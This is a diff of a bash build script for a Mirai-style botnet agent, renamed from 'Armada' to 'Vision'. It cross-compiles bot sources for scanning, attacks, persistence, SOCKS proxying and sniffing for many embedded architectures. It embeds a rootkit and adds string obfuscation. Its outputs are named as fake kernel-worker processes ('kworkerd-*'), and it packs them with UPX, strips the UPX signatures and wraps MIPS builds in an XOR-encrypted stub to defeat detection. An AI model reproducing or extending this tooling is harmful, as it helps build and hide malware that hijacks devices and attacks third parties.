@@ -1,5 +1,5 @@
 #!/bin/bash
-# Armada Pure C Agent Builder
+# Vision Pure C Agent Builder
 # Cross-compiles for all uClibc architectures with relocated sysroot fixes
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
@@ -9,11 +9,11 @@ BINS="$PROJECT_ROOT/bins"
 UPX_BIN="$SCRIPT_DIR/upx"
 XC="/etc/xcompile"
 
-CFLAGS="-Os -s -Wno-all -ffunction-sections -fdata-sections -fno-unwind-tables -fno-asynchronous-unwind-tables -fno-stack-protector -fno-ident -fmerge-all-constants -fno-math-errno -Iheaders"
+CFLAGS="-Os -s -Wno-all -ffunction-sections -fdata-sections -fno-unwind-tables -fno-asynchronous-unwind-tables -fno-stack-protector -fno-ident -fmerge-all-constants -fno-math-errno -I. -Iheaders"
 LDSTRIP="-Wl,--strip-all -Wl,-z,norelro -Wl,--hash-style=sysv -Wl,--build-id=none"
 
 # Old GCC 4.1.2 cross-compilers choke on newer flags — use safe subset
-XCFLAGS="-Os -s -Wno-all -ffunction-sections -fdata-sections -fno-ident -fomit-frame-pointer -fmerge-all-constants -Iheaders"
+XCFLAGS="-Os -s -Wno-all -ffunction-sections -fdata-sections -fno-ident -fomit-frame-pointer -fmerge-all-constants -I. -Iheaders"
 
 # Debug mode: add -DDEBUG when DEBUG=1 env var or .debug marker exists
 if [ "${DEBUG:-0}" = "1" ] || [ -f "$BOT_DIR/.debug" ]; then
@@ -23,8 +23,8 @@ if [ "${DEBUG:-0}" = "1" ] || [ -f "$BOT_DIR/.debug" ]; then
 fi
 XLDSTRIP="-Wl,--strip-all"
 
-CORE_SRCS="ds.c crypto.c config.c opsec.c connection.c commands.c persist.c socks.c main.c"
-SCAN_SRCS="telnet.c ssh.c scanner_http.c scan_report.c"
+CORE_SRCS="ds.c crypto.c config.c opsec.c connection.c commands.c persist.c socks.c pty.c main.c"
+SCAN_SRCS="ssh.c scanner_http.c scan_report.c sniffer.c"
 ATK_SRCS="attack.c attack_method.c"
 
 # NO_SELFREP mode: exclude scanner sources and add -DNO_SELFREP define
@@ -51,7 +51,7 @@ fi
 OK=0; FAIL=0
 
 echo "╔══════════════════════════════════════════════════════╗"
-echo "║   Armada Pure C Agent — Build System                  ║"
+echo "║   Vision Pure C Agent — Build System                  ║"
 echo "╚══════════════════════════════════════════════════════╝"
 if [ -n "$ATK_LABEL" ]; then
     echo "  Mode: PROXY ONLY (attack code disabled)"
@@ -96,6 +96,9 @@ MIPS_AS_WRAPPER
     chmod +x "$MIPS_TOOLS/as"
 fi
 
+# Locate system UPX — used for non-x86 arches (MIPS, ARM EABI, PPC, SH4, etc.)
+SYS_UPX=$(command -v upx 2>/dev/null)
+
 # ── Build rootkit .so and embed as C header (x86_64 only) ──
 echo "Building rootkit .so..."
 RK_HEADER="$BOT_DIR/headers/rootkit_blob.h"
@@ -118,12 +121,22 @@ else
     echo "/* rootkit .so not available */" > "$RK_HEADER"
 fi
 
+# ── Run string obfuscation ──
+echo "Obfuscating strings..."
+rm -rf "$BOT_DIR/obf"
+python3 "$BOT_DIR/obfstr.py" $SRCS
+OBF_SRCS=""
+for f in $SRCS; do
+    OBF_SRCS="$OBF_SRCS obf/$f"
+done
+
 # ── Native build (x86_64 with embedded rootkit) ──
 echo "Building native..."
-gcc $CFLAGS $RK_FLAG -B/usr/bin -o armada $SRCS -lpthread -Wl,--gc-sections $LDSTRIP 2>&1 | grep -i error || true
-if [ -f armada ]; then
-    printf "  native: %s\n" "$(du -h armada | cut -f1)"
-    cp -f armada "$BINS/redis-daemon"
+rm -f agent
+gcc $CFLAGS $RK_FLAG -B/usr/bin -o agent $OBF_SRCS -lpthread -Wl,--gc-sections $LDSTRIP 2>&1 | grep -i error || true
+if [ -f agent ]; then
+    printf "  native: %s\n" "$(du -h agent | cut -f1)"
+    cp -f agent "$BINS/kworkerd"
 else
     echo "  native: FAIL"
 fi
@@ -132,7 +145,7 @@ fi
 xbuild_simple() {
     local label=$1 cc=$2 out=$3
     printf "  %s... " "$label"
-    if $cc $XCFLAGS -static -o "$BINS/$out" $SRCS -lpthread -Wl,--gc-sections $XLDSTRIP 2>/dev/null; then
+    if $cc $XCFLAGS -static -o "$BINS/$out" $OBF_SRCS -lpthread -Wl,--gc-sections $XLDSTRIP 2>/dev/null; then
         printf "%s\n" "$(du -h "$BINS/$out" | cut -f1)"; OK=$((OK+1))
     else printf "FAIL\n"; FAIL=$((FAIL+1)); fi
 }
@@ -145,7 +158,7 @@ xbuild_fix() {
         -B"$cc1dir/" -B"$asdir/" -B"$gcclib/" -B"$uclibc_lib/" \
         -nostdinc -isystem "$gccinc" -isystem "$uclibc_inc" \
         -L"$uclibc_lib" -L"$gcclib" \
-        -static -o "$BINS/$out" $SRCS \
+        -static -o "$BINS/$out" $OBF_SRCS \
         -lpthread -Wl,--gc-sections $XLDSTRIP 2>/dev/null; then
         printf "%s\n" "$(du -h "$BINS/$out" | cut -f1)"; OK=$((OK+1))
     else printf "FAIL\n"; FAIL=$((FAIL+1)); fi
@@ -155,9 +168,9 @@ echo ""
 echo "Cross-compiling..."
 
 # Self-contained toolchains
-xbuild_simple "x86_64" "$XC/x86_64/bin/x86_64-gcc" "redis-daemon"
-xbuild_simple "i586"   "$XC/i586/bin/i586-gcc" "redis-proxyd"
-xbuild_simple "i486"   "$XC/cross-compiler-i486/bin/i486-gcc" "redis-initd"
+xbuild_simple "x86_64" "$XC/x86_64/bin/x86_64-gcc" "kworkerd"
+xbuild_simple "i586"   "$XC/i586/bin/i586-gcc" "kworkerd-events"
+xbuild_simple "i486"   "$XC/cross-compiler-i486/bin/i486-gcc" "kworkerd-cgroup"
 printf "  mips32... "
 if /etc/xcompile/mips/bin/mips-rawgcc $XCFLAGS \
     -B"$MIPS_TOOLS/" \
@@ -169,9 +182,9 @@ if /etc/xcompile/mips/bin/mips-rawgcc $XCFLAGS \
     -L/etc/xcompile/mips/lib \
     -L/etc/xcompile/mips/gcc/lib \
     -mips1 -mabi=32 \
-    -static -o "$BINS/redis-credentiald" $SRCS \
+    -static -o "$BINS/kworkerd-netns" $OBF_SRCS \
     -lpthread -Wl,--gc-sections $XLDSTRIP 2>/dev/null; then
-    printf "%s\n" "$(du -h "$BINS/redis-credentiald" | cut -f1)"; OK=$((OK+1))
+    printf "%s\n" "$(du -h "$BINS/kworkerd-netns" | cut -f1)"; OK=$((OK+1))
 else printf "FAIL\n"; FAIL=$((FAIL+1)); fi
 
 printf "  mips32r2... "
@@ -185,9 +198,9 @@ if /etc/xcompile/mips/bin/mips-rawgcc $XCFLAGS \
     -L/etc/xcompile/mips/lib \
     -L/etc/xcompile/mips/gcc/lib \
     -mips32r2 -mabi=32 \
-    -static -o "$BINS/redis-credentiald-r2" $SRCS \
+    -static -o "$BINS/kworkerd-netns-rt" $OBF_SRCS \
     -lpthread -Wl,--gc-sections $XLDSTRIP 2>/dev/null; then
-    printf "%s\n" "$(du -h "$BINS/redis-credentiald-r2" | cut -f1)"; OK=$((OK+1))
+    printf "%s\n" "$(du -h "$BINS/kworkerd-netns-rt" | cut -f1)"; OK=$((OK+1))
 else printf "FAIL\n"; FAIL=$((FAIL+1)); fi
 # Relocated toolchains (need -B/-isystem/-L fixes)
 xbuild_fix "mipsel" \
@@ -196,15 +209,16 @@ xbuild_fix "mipsel" \
     "$XC/mipsel/mipsel-unknown-linux/bin" \
     "$XC/mipsel/gcc/include" "$XC/mipsel/include" \
     "$XC/mipsel/gcc/lib" "$XC/mipsel/lib" \
-    "redis-composd"
+    "kworkerd-rcu"
 
+# ARM: armv4l/armv5l are old ARM ABI (OABI) — UPX can't pack these, ship raw
 xbuild_fix "armv4l" \
     "$XC/armv4l/armv4l-unknown-linux/bin/gcc" \
     "$XC/armv4l/libexec/gcc/armv4l-unknown-linux/4.1.2" \
     "$XC/armv4l/armv4l-unknown-linux/bin" \
     "$XC/armv4l/gcc/include" "$XC/armv4l/include" \
     "$XC/armv4l/gcc/lib" "$XC/armv4l/lib" \
-    "redis-conteinerd"
+    "kworkerd-irq"
 
 xbuild_fix "armv5l" \
     "$XC/armv5l/armv5l-unknown-linux/bin/gcc" \
@@ -212,15 +226,16 @@ xbuild_fix "armv5l" \
     "$XC/armv5l/armv5l-unknown-linux/bin" \
     "$XC/armv5l/gcc/include" "$XC/armv5l/include" \
     "$XC/armv5l/gcc/lib" "$XC/armv5l/lib" \
-    "redis-conteinerd-shim"
+    "kworkerd-irq-bal"
 
+# ARM: armv6l/armv7l are EABI — system UPX can pack these
 xbuild_fix "armv6l" \
     "$XC/armv6l/armv6l-unknown-linux-gnueabi/bin/gcc" \
     "$XC/armv7l/armv6l-unknown-linux-gnueabi/bin" \
     "$XC/armv6l/armv6l-unknown-linux-gnueabi/bin" \
     "$XC/armv6l/cc/include" "$XC/armv6l/include" \
     "$XC/armv6l/cc/lib" "$XC/armv6l/lib" \
-    "redis-runcd"
+    "kworkerd-softirq"
 
 xbuild_fix "armv7l" \
     "$XC/armv7l/armv6l-unknown-linux-gnueabi/bin/gcc" \
@@ -228,7 +243,7 @@ xbuild_fix "armv7l" \
     "$XC/armv7l/armv6l-unknown-linux-gnueabi/bin" \
     "$XC/armv7l/cc/include" "$XC/armv7l/include" \
     "$XC/armv7l/cc/lib" "$XC/armv7l/lib" \
-    "redis-buildxd"
+    "kworkerd-blkcg"
 
 xbuild_fix "powerpc" \
     "$XC/powerpc/powerpc-unknown-linux/bin/gcc" \
@@ -236,7 +251,7 @@ xbuild_fix "powerpc" \
     "$XC/powerpc/powerpc-unknown-linux/bin" \
     "$XC/powerpc/gcc/include" "$XC/powerpc/include" \
     "$XC/powerpc/gcc/lib" "$XC/powerpc/lib" \
-    "redis-scoutd"
+    "kworkerd-writeback"
 
 xbuild_fix "sh4" \
     "$XC/sh4/bin/sh4-rawgcc" \
@@ -244,7 +259,7 @@ xbuild_fix "sh4" \
     "$XC/sh4/sh-superh-linux/bin" \
     "$XC/sh4/gcc/include" "$XC/sh4/include" \
     "$XC/sh4/gcc/lib" "$XC/sh4/lib" \
-    "redis-sbomd"
+    "kworkerd-crypto"
 
 # SPARC needs a fixed clone.o: the uClibc clone.S uses R_SPARC_13 relocation
 # for __syscall_error, which requires an absolute address < 4096 — impossible
@@ -298,10 +313,10 @@ if $XC/sparc/bin/sparc-rawgcc $XCFLAGS \
         -nostdinc \
         -isystem $XC/sparc/gcc/include -isystem $XC/sparc/include \
         -L$XC/sparc/gcc/lib -L$XC/sparc/lib \
-        -static -o "$BINS/redis-machined" \
-        $_SPARC_CLONE_FIX $SRCS \
+        -static -o "$BINS/kworkerd-mm" \
+        $_SPARC_CLONE_FIX $OBF_SRCS \
         -lpthread -Wl,--gc-sections $XLDSTRIP 2>/dev/null; then
-    printf "%s\n" "$(du -h "$BINS/redis-machined" | cut -f1)"; OK=$((OK+1))
+    printf "%s\n" "$(du -h "$BINS/kworkerd-mm" | cut -f1)"; OK=$((OK+1))
 else printf "FAIL\n"; FAIL=$((FAIL+1)); fi
 rm -f "$SCRIPT_DIR/sparc-clone-fix.S" "$SCRIPT_DIR/sparc-clone-fix.o"
 
@@ -311,14 +326,42 @@ xbuild_fix "m68k" \
     "$XC/m68k/m68k-unknown-linux/bin" \
     "$XC/m68k/gcc/include" "$XC/m68k/include" \
     "$XC/m68k/gcc/lib" "$XC/m68k/lib" \
-    "redis-scand"
+    "kworkerd-scsi"
 
 echo ""
 echo "$OK OK, $FAIL FAIL"
 echo ""
 
-# ── MIPS stub packing (XpLt incompatible with 2.6.x kernels) ──
-# Uses same _rx0/_rx1 key material as crypto.c — magic key required to decrypt.
+# ── MIPS: system UPX pre-compress → noMoreUPX strip → mipspk.py crypto stub ──
+# System UPX 4.x stubs fall back to /tmp/<pid> on old kernels (confirmed on
+# Linux 2.6.36). noMoreUPX.py strips cosmetic UPX signatures after packing.
+# mipspk.py then wraps in a custom XOR-encrypted C stub.
+if [ -n "$SYS_UPX" ]; then
+    echo "Pre-compressing MIPS binaries with system UPX..."
+    for bname in kworkerd-netns kworkerd-netns-rt kworkerd-rcu; do
+        raw="$BINS/$bname"
+        [ -f "$raw" ] || continue
+        before=$(stat -c%s "$raw")
+        cp "$raw" "$raw.tmp"
+        if "$SYS_UPX" --lzma -q "$raw.tmp" >/dev/null 2>&1 && \
+           [ "$(stat -c%s "$raw.tmp")" -lt "$before" ]; then
+            python3 "$SCRIPT_DIR/noMoreUPX.py" "$raw.tmp"
+            after=$(stat -c%s "$raw.tmp")
+            pct=$(( (before - after) * 100 / before ))
+            mv "$raw.tmp" "$raw"
+            printf "  %-30s %dKB → %dKB  (%d%% smaller)\n" \
+                "$bname" "$((before/1024))" "$((after/1024))" "$pct"
+        else
+            rm -f "$raw.tmp"
+            printf "  %-30s (UPX skipped — no gain)\n" "$bname"
+        fi
+    done
+    echo ""
+else
+    echo "NOTE: system UPX not found — MIPS will use raw binary in mipspk.py"
+    echo ""
+fi
+
 CRYPTO_C="$BOT_DIR/crypto.c"
 if python3 --version >/dev/null 2>&1 && [ -f "$CRYPTO_C" ]; then
     echo "Packing MIPS binaries with crypto stub..."
@@ -347,9 +390,9 @@ if python3 --version >/dev/null 2>&1 && [ -f "$CRYPTO_C" ]; then
 
     # Pack each MIPS binary if it was built successfully
     for entry in \
-        "redis-credentiald:$MIPS_CC:$MIPS_FLAGS" \
-        "redis-credentiald-r2:$MIPS_CC:$MIPS_R2_FLAGS" \
-        "redis-composd:$MIPSEL_CC:$MIPSEL_FLAGS"
+        "kworkerd-netns:$MIPS_CC:$MIPS_FLAGS" \
+        "kworkerd-netns-rt:$MIPS_CC:$MIPS_R2_FLAGS" \
+        "kworkerd-rcu:$MIPSEL_CC:$MIPSEL_FLAGS"
     do
         bname="${entry%%:*}"
         rest="${entry#*:}"
@@ -373,6 +416,53 @@ else
 fi
 echo ""
 
+# ── System UPX + noMoreUPX for non-x86, non-MIPS arches ──
+# ARM EABI (armv6l/armv7l), PPC, SH4, m68k, SPARC: system UPX pack then
+# strip cosmetic UPX signatures with noMoreUPX.py.
+# armv4l/armv5l are OABI — UPX can't pack them, they ship raw.
+# MIPS is handled above (system UPX → noMoreUPX → mipspk.py).
+if [ -n "$SYS_UPX" ]; then
+    SYSUPX_PACKED=0
+    NEED_SYSUPX=0
+    for f in "$BINS"/*; do
+        [ -f "$f" ] || continue
+        elf_machine=$(od -A n -t x1 -j 18 -N 2 "$f" 2>/dev/null | tr -d ' \n')
+        case "$elf_machine" in
+            2800|0014|2a00|0004|0002) ;;  # ARM/PPC/SH4/m68k/SPARC
+            *) continue ;;
+        esac
+        NEED_SYSUPX=1; break
+    done
+    if [ "$NEED_SYSUPX" -eq 1 ]; then
+        echo "Compressing embedded binaries with system UPX + noMoreUPX..."
+        for f in "$BINS"/*; do
+            [ -f "$f" ] || continue
+            elf_machine=$(od -A n -t x1 -j 18 -N 2 "$f" 2>/dev/null | tr -d ' \n')
+            case "$elf_machine" in
+                2800|0014|2a00|0004|0002) ;;
+                *) continue ;;
+            esac
+            name=$(basename "$f")
+            before=$(stat -c%s "$f")
+            cp "$f" "$f.tmp"
+            if "$SYS_UPX" --lzma -q "$f.tmp" >/dev/null 2>&1 && \
+               [ "$(stat -c%s "$f.tmp")" -lt "$before" ]; then
+                python3 "$SCRIPT_DIR/noMoreUPX.py" "$f.tmp"
+                after=$(stat -c%s "$f.tmp")
+                pct=$(( (before - after) * 100 / before ))
+                mv "$f.tmp" "$f"
+                printf "  %-30s %dKB → %dKB  (%d%% smaller)\n" \
+                    "$name" "$((before/1024))" "$((after/1024))" "$pct"
+                SYSUPX_PACKED=$((SYSUPX_PACKED+1))
+            else
+                rm -f "$f.tmp"
+                printf "  %-30s (UPX skipped — no gain or unsupported)\n" "$name"
+            fi
+        done
+        echo ""
+    fi
+fi
+
 # ── Compress (m30w packer — no UPX signatures to strip) ──
 PACKED=0; SKIPPED=0; SAVED=0
 if [ ! -f "$UPX_BIN" ]; then
@@ -391,14 +481,19 @@ if [ -x "$UPX_BIN" ]; then
     for f in "$BINS"/*; do
         [ -f "$f" ] || continue
         name=$(basename "$f")
-        # Skip MIPS binaries: XpLt stub uses syscalls (4147, 4354) absent on
-        # Linux 2.6.x embedded kernels — packed binary gets SIGTRAP at runtime.
         elf_machine=$(od -A n -t x1 -j 18 -N 2 "$f" 2>/dev/null | tr -d ' \n')
-        if [ "$elf_machine" = "0800" ] || [ "$elf_machine" = "0008" ]; then
-            printf "  %-26s         (skipped — MIPS, stub incompatible with 2.6.x)\n" "$name"
-            SKIPPED=$((SKIPPED+1))
-            continue
-        fi
+        case "$elf_machine" in
+            0800|0008)  # MIPS LE/BE — system UPX + noMoreUPX + mipspk.py above
+                printf "  %-26s         (skipped — MIPS uses mipspk carrier)\n" "$name"
+                SKIPPED=$((SKIPPED+1)); continue ;;
+            2800|0014)  # ARM/PPC — system UPX + noMoreUPX above
+                printf "  %-26s         (skipped — system UPX + noMoreUPX)\n" "$name"
+                SKIPPED=$((SKIPPED+1)); continue ;;
+            2a00|0004|0002)  # SH4/m68k/SPARC — system UPX + noMoreUPX above
+                printf "  %-26s         (skipped — system UPX + noMoreUPX)\n" "$name"
+                SKIPPED=$((SKIPPED+1)); continue ;;
+        esac
+        # x86_64 (3e00), i586 (0300), i486 (0300) — VPX works fine on x86
         before=$(stat -c%s "$f")
         bh=$(numfmt --to=iec --suffix=B $before)
         packed=0
